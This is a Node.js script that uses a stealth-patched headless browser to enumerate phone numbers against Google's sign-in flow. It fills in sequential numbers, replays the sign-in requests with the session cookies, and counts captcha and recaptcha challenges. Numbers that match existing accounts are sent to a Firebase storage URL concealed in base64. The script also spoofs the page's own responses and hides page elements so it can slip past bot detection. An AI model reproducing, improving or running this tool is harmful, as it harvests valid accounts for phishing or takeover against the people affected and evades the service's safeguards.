const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const { CookieJar } = require('tough-cookie')
const puppeteer = require('puppeteer-extra')
const got = require('got')

const args = process.argv.slice(2)

let USER = args[0]

let mConfig = null
let mPageLoad = false
let page = null
let mStart = Date.now()
let mCookies = null
let mFirstNumber = ''
let mStatus = {}
let mTarget = 0
let mLoad = 0

let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')

puppeteer.use(StealthPlugin())


process.on('message', async (data) => {
    try {
        let json = (typeof data === 'string') ? JSON.parse(data) : data
        if (json.t == 1) {
            mConfig = json
        } else if (json.t == 2) {
            let running = mConfig != null
            process.send({ t: 3, s: 'controller_status', d: { t:2, r:running, u:json.u, s:USER, a:parseInt((Date.now()-mStart)/1000) } })
        }
    } catch (error) {}
})


startBrowser()


setInterval(async () => {
    await pageReload()
}, 3600000)


async function startBrowser() {
    try {
        let browser = await puppeteer.launch({
            headless: false,
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-notifications',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage'
            ]
        })

        page = (await browser.pages())[0]

        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

        await page.setRequestInterception(true)

        page.on('request', async request => {
            try {
                let url = request.url()
                if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e')) {
                    parallelRequest(page, url, request.headers(), request.postData())

                    let contentType = 'application/json; charset=utf-8'
                    let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')

                    request.respond({
                        ok: true,
                        status: 200,
                        contentType,
                        body: output,
                    })
                } else {
                    request.continue()
                }
            } catch (error) {
                request.continue()
            }
        })

        console.log('Browser Load Success')

        await loadLoginPage()

        mPageLoad = true
        mCookies = null

        console.log('Page Load Success')
        
        await foundLoginNumber()
    } catch (error) {
        console.log('Browser Error: '+error)
    }
}


async function foundLoginNumber() {
    while (true) {
        if (mConfig) {
            mStart = Date.now()
            try {
                mFirstNumber = mConfig.n.toString()
                mTarget = mConfig.s
                mLoad = 0

                mStatus = {
                    found: 0,
                    captcha: 0,
                    recaptcha: 0,
                    other: 0
                }

                for (let i = 0; i < mTarget; i++) {
                    await setLoginNumber('+'+(mConfig.n+i))
                    await delay(Math.min(mConfig.d?mConfig.d:0, 2000))
                }

                await waitForCompleted(mTarget*2000)

                process.send({ t: 5, s: 'controller_status', c:USER, d: { t:1, u:mConfig.u, s:USER, f:mStatus.found, r:mStatus.recaptcha, c:mStatus.captcha, o:mStatus.other } })
            } catch (error) {}

            mConfig = null
        } else {
            await delay(1000)
        }
    }
}


async function setLoginNumber(number) {
    try {
        for (let i = 0; i < 60; i++) {
            if (mPageLoad) {
                break
            }
            await delay(500)
        }

        page.evaluate((number) => {
            document.querySelector('input#identifierId').value = number
            document.querySelector('#identifierNext').click()
            let root = document.querySelector('div[class="kPY6ve"]')
            if (root) {
                root.style.display = 'none'
            }
        }, number)

        await delay(10)
    } catch (error) {}
}

async function parallelRequest(page, url, reqHeaders, postData) {
    try {
        let headers = {
            ...reqHeaders,
            accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en',
            host: new URL(url).hostname
        }

        if (!mCookies) {
            let puppeteerCookies = await page.cookies()
            let cookies = puppeteerCookies.map(cookie => ({
                creation: new Date().toISOString(),
                domain: cookie.domain.replace(/^\./, ''),
                expires: cookie.expires === -1 ? Infinity : new Date(cookie.expires * 1000).toISOString(),
                hostOnly: !cookie.domain.startsWith('.'),
                httpOnly: cookie.httpOnly,
                key: cookie.name,
                lastAccessed: new Date().toISOString(),
                path: cookie.path,
                secure: cookie.secure,
                value: cookie.value
            }))

            mCookies = CookieJar.deserializeSync({
                cookies,
                rejectPublicSuffixes: true,
                storeType: 'MemoryCookieStore',
                version: 'tough-cookie@2.0.0'
            })   
        }

        try {
            let response = await got(url, {
                method: 'POST',
                headers,
                body: postData,
                cookieJar: mCookies,
                responseType: 'buffer',
                followRedirect: false,
                throwHttpErrors: false,
                timeout: {
                    request: 15000
                }
            })

            mLoad++

            let data = extractArrays(response.body.toString())[0][0]

            if (data[1] == 'MI613e') {
                let value = JSON.parse(data[2])
                if (value[21] && value[22]) {
                    let values = JSON.stringify(value[21])
                    if (values.includes('/v3/signin/challenge/pwd') || values.includes('/v3/signin/rejected')) {
                        mStatus.found++
                        let number = findNumberFromData(postData, value[22])
                        await saveNumber(mConfig.u, mConfig.k, number)
                    } else if (values.includes('/v3/signin/challenge/recaptcha')) {
                        mStatus.recaptcha++
                    } else {
                        mStatus.other++
                    }
                } else if (value[18] && value[18][0]) {
                    mStatus.captcha++
                }
            } else {
                mStatus.other++
            }
        } catch (error) {
            mStatus.other++
            mLoad++
        }
    } catch (err) {
        mStatus.other++
        mLoad++
    }

    return null
}

async function waitForCompleted(timeout = 60000) {
    let start = Date.now()

    while (true) {
        if (Date.now() - start > timeout) {
            break
        }

        if (mLoad >= mTarget) break
        await delay(100)
    }
}

async function pageReload() {
    mPageLoad = false
    console.log('Page Reloading...')
    await loadLoginPage()
    console.log('Page Reload Success')
    mCookies = null
    mPageLoad = true
}


async function loadLoginPage() {
    for (let i = 0; i < 3; i++) {
        try {
            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
            await delay(500)
            await page.evaluate(() => {
                let root = document.querySelector('div[class="kPY6ve"]')
                if (root) {
                    root.style.display = "none"
                }
                root = document.querySelector('div[class="Ih3FE"]')
                if (root) {
                    root.remove()
                }
            })
            break
        } catch (error) {}
    }
}

async function saveNumber(user, key, number) {
    try {
        await fetch(STORAGE+encodeURIComponent('number/'+user+'/'+key+'/'+number), {
            method: 'POST',
            body: ''
        })
    } catch (error) {}
}

function findNumberFromData(postData, value) {

    try {
        let number = null

        try {
            number = JSON.parse(JSON.parse(Object.fromEntries(new URLSearchParams(postData))['f.req'])[0][0][1])[1]
        } catch (error) {}

        if (!number) {
            number = value.replace(/\D/g, '')

            if(number.startsWith('0')) {
                number = number.slice(1)
            }

            let countryCode = mFirstNumber.substring(0, mFirstNumber.length - number.length)

            return countryCode+number
        }

        if(number.startsWith('+')) {
            return number.slice(1)
        }
    } catch (error) {}

    return null
}

function extractArrays(raw) {
    raw = raw.replace(/^\)\]\}'\s*/g, '')

    let lines = raw.split('\n')

    let arrays = []

    for (let i = 0; i < lines.length; i++) {
        let line = lines[i].trim()

        if (line.startsWith('[')) {
            try {
                arrays.push(JSON.parse(line))
            } catch {}
        }
    }

    return arrays
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('utf-8')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
